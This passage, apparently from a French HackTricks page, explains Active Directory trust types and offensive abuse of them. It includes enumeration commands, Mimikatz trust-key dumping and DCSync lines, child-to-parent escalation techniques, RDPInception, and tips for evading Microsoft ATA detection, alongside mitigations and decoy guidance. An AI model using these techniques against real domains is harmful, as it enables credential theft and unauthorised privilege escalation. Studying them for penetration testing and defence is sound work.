- **Cross-link Trusts** : Appelés "shortcut trusts", ils sont établis entre child domains pour accélérer les processus de referral. Dans des forests complexes, les referrals d'authentification doivent typiquement remonter jusqu'à la racine de la forest puis redescendre vers le domaine cible. En créant des cross-links, le trajet est raccourci, ce qui est particulièrement bénéfique dans des environnements géographiquement dispersés.
- **External Trusts** : Ceux-ci sont configurés entre des domaines différents et non liés, et sont par nature non-transitifs. Selon la documentation de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), les external trusts sont utiles pour accéder aux ressources d'un domaine en dehors de la forest actuelle qui n'est pas connecté par un forest trust. La sécurité est renforcée par le filtrage SID avec les external trusts.
- **Tree-root Trusts** : Ces trusts sont automatiquement établis entre le forest root domain et une nouvelle tree root ajoutée. Bien que rarement rencontrés, les tree-root trusts sont importants pour ajouter de nouveaux arbres de domaines à une forest, leur permettant de maintenir un nom de domaine unique et en assurant la transitivité à deux voies. Plus d'informations sont disponibles dans le guide de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts** : Ce type de trust est un trust transitive à deux voies entre deux forest root domains, appliquant également un filtrage SID pour renforcer les mesures de sécurité.
- **MIT Trusts** : Ces trusts sont établis avec des domaines Kerberos non-Windows, conformes à [RFC4120](https://tools.ietf.org/html/rfc4120). Les MIT trusts sont un peu plus spécialisés et s'adressent aux environnements nécessitant une intégration avec des systèmes Kerberos en dehors de l'écosystème Windows.

#### Other differences in **trusting relationships**

- Une relation de trust peut aussi être **transitive** (A trust B, B trust C, alors A trust C) ou **non-transitive**.
- Une relation de trust peut être configurée comme **bidirectional trust** (les deux se font confiance) ou comme **one-way trust** (seul l'un fait confiance à l'autre).

### Attack Path

1. **Énumérer** les relations de trusting
2. Vérifier si un quelconque **security principal** (user/group/computer) a **accès** aux ressources de **l'autre domaine**, peut-être via des entrées ACE ou en faisant partie de groupes de l'autre domaine. Recherchez des **relations à travers les domaines** (le trust a probablement été créé pour cela).
1. kerberoast dans ce cas pourrait être une autre option.
3. **Compromettre** les **comptes** qui peuvent **pivot** entre les domaines.

Les attaquants peuvent accéder aux ressources d'un autre domaine via trois mécanismes principaux :

- **Local Group Membership** : Des principals peuvent être ajoutés à des groupes locaux sur des machines, tels que le groupe “Administrators” sur un serveur, leur donnant un contrôle important sur cette machine.
- **Foreign Domain Group Membership** : Les principals peuvent aussi être membres de groupes au sein du domaine étranger. Cependant, l'efficacité de cette méthode dépend de la nature du trust et de la portée du groupe.
- **Access Control Lists (ACLs)** : Des principals peuvent être spécifiés dans une **ACL**, particulièrement comme entités dans des **ACEs** au sein d'une **DACL**, leur fournissant un accès à des ressources spécifiques. Pour ceux qui souhaitent approfondir la mécanique des ACLs, DACLs et ACEs, le whitepaper intitulé “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” est une ressource précieuse.

### Find external users/groups with permissions

Vous pouvez vérifier **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** pour trouver les foreign security principals dans le domaine. Ceux-ci seront des users/groups provenant **d'un domaine/forest externe**.

Vous pouvez vérifier cela dans **Bloodhound** ou en utilisant powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalade de privilèges de forêt Child-to-Parent
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Autres façons d'énumérer les trusts de domaine :
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Il y a **2 trusted keys**, une pour _Child --> Parent_ et une autre pour _Parent_ --> _Child_.\
> Vous pouvez obtenir celle utilisée par le domaine actuel avec :
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin to the child/parent domain abusing the trust with SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Il est crucial de comprendre comment la Configuration Naming Context (NC) peut être exploitée. La Configuration NC sert de référentiel central pour les données de configuration à travers une forêt dans les environnements Active Directory (AD). Ces données sont répliquées sur chaque Domain Controller (DC) de la forêt, les DC écriturables conservant une copie écrivable de la Configuration NC. Pour exploiter cela, il faut avoir **SYSTEM privileges on a DC**, de préférence un child DC.

**Link GPO to root DC site**

Le conteneur Sites de la Configuration NC inclut des informations sur les sites de tous les ordinateurs joints au domaine au sein de la forêt AD. En opérant avec SYSTEM privileges on any DC, un attaquant peut lier des GPOs aux sites root DC. Cette action compromet potentiellement le root domain en manipulant les stratégies appliquées à ces sites.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vecteur d'attaque consiste à cibler des gMSA privilégiés au sein du domaine. La KDS Root key, essentielle pour calculer les mots de passe des gMSA, est stockée dans la Configuration NC. Avec SYSTEM privileges on any DC, il est possible d'accéder à la KDS Root key et de calculer les mots de passe de n'importe quel gMSA à travers la forêt.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Cette méthode demande de la patience, en attendant la création de nouveaux objets AD privilégiés. Avec SYSTEM privileges, un attaquant peut modifier le AD Schema pour accorder à n'importe quel utilisateur le contrôle total sur toutes les classes. Cela peut conduire à un accès et un contrôle non autorisés sur les nouveaux objets AD créés.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnérabilité ADCS ESC5 cible le contrôle des objets PKI pour créer un template de certificat permettant de s'authentifier en tant que n'importe quel utilisateur au sein de la forêt. Comme les objets PKI résident dans la Configuration NC, compromettre un DC enfant écrivable permet d'exécuter des attaques ESC5.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Dans ce scénario **votre domaine est trusted** par un domaine externe, ce qui vous confère **des permissions indéterminées** sur celui-ci. Vous devrez déterminer **quels principals de votre domaine ont quels accès sur le domaine externe** puis essayer de les exploiter :

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domaine de forêt externe - Sens unique (sortant)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Dans ce scénario **votre domaine** accorde des **privilèges** à un principal provenant d'**un domaine différent**.

Cependant, lorsqu'un **domaine est approuvé** par le domaine qui accorde la confiance, le domaine approuvé **crée un utilisateur** avec un **nom prévisible** qui utilise comme **mot de passe le mot de passe du domaine approuvé**. Ce qui signifie qu'il est possible d'**accéder à un utilisateur du domaine qui accorde la confiance pour entrer dans le domaine approuvé** afin de l'énumérer et d'essayer d'escalader davantage de privilèges :


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Une autre façon de compromettre le domaine approuvé est de trouver un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) créé dans la **direction opposée** de la confiance de domaine (ce qui n'est pas très courant).

Une autre façon de compromettre le domaine approuvé est d'attendre sur une machine où un **utilisateur du domaine approuvé peut se connecter** via **RDP**. Ensuite, l'attaquant pourrait injecter du code dans le processus de session RDP et **accéder au domaine d'origine de la victime** depuis là.\
De plus, si la **victime a monté son disque dur**, depuis le processus de **session RDP** l'attaquant pourrait stocker des **backdoors** dans le **dossier de démarrage du disque dur**. Cette technique s'appelle **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Atténuation des abus de confiance entre domaines

### **SID Filtering:**

- Le risque d'attaques exploitant l'attribut SIDHistory à travers des trusts entre forêts est atténué par SID Filtering, qui est activé par défaut sur tous les trusts entre forêts. Cela repose sur l'hypothèse que les trusts intra-forêt sont sûrs, considérant la forêt, plutôt que le domaine, comme la frontière de sécurité selon la position de Microsoft.
- Cependant, il y a un revers : SID Filtering peut perturber des applications et l'accès des utilisateurs, conduisant parfois à sa désactivation.

### **Selective Authentication:**

- Pour les trusts entre forêts, l'utilisation de Selective Authentication garantit que les utilisateurs des deux forêts ne sont pas automatiquement authentifiés. À la place, des permissions explicites sont requises pour que les utilisateurs accèdent aux domaines et serveurs du domaine ou de la forêt qui accorde la confiance.
- Il est important de noter que ces mesures ne protègent pas contre l'exploitation du Configuration Naming Context (NC) inscriptible ni contre les attaques visant le compte de trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Quelques défenses générales

[**En savoir plus sur la protection des identifiants ici.**](../stealing-credentials/credentials-protections.md)

### **Mesures défensives pour la protection des identifiants**

- **Domain Admins Restrictions** : Il est recommandé que les Domain Admins soient autorisés à se connecter uniquement aux Domain Controllers, en évitant leur usage sur d'autres hôtes.
- **Service Account Privileges** : Les services ne doivent pas s'exécuter avec des privilèges Domain Admin (DA) pour maintenir la sécurité.
- **Temporal Privilege Limitation** : Pour les tâches nécessitant des privilèges DA, leur durée doit être limitée. Cela peut être réalisé par : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implémentation de techniques de leurre**

- La mise en œuvre du leurre implique de poser des pièges, comme des utilisateurs ou ordinateurs factices, avec des caractéristiques telles que des mots de passe qui n'expirent pas ou marqués comme Trusted for Delegation. Une approche détaillée inclut la création d'utilisateurs avec des droits spécifiques ou leur ajout à des groupes à privilèges élevés.
- Un exemple pratique implique l'utilisation d'outils tels que : `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Plus d'informations sur le déploiement de techniques de leurre sont disponibles sur [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifier le leurre**

- **Pour les objets utilisateur** : Les indicateurs suspects incluent un ObjectSID atypique, des connexions peu fréquentes, des dates de création et un faible nombre d'échecs de mot de passe.
- **Indicateurs généraux** : Comparer les attributs des objets potentiellement factices avec ceux des objets réels peut révéler des incohérences. Des outils comme [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à identifier ces leurres.

### **Contourner les systèmes de détection**

- **Bypass de la détection Microsoft ATA** :
- **Énumération d'utilisateurs** : Éviter l'énumération des sessions sur les Domain Controllers pour prévenir la détection par ATA.
- **Impersonation de ticket** : L'utilisation de clés **aes** pour la création de tickets aide à échapper à la détection en n'effectuant pas de rétrogradation vers NTLM.
- **Attaques DCSync** : Il est conseillé d'exécuter depuis un hôte non-Domain Controller pour éviter la détection par ATA, car une exécution directe depuis un Domain Controller déclenchera des alertes.

## Références

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

{{#include ../../banners/hacktricks-training.md}}
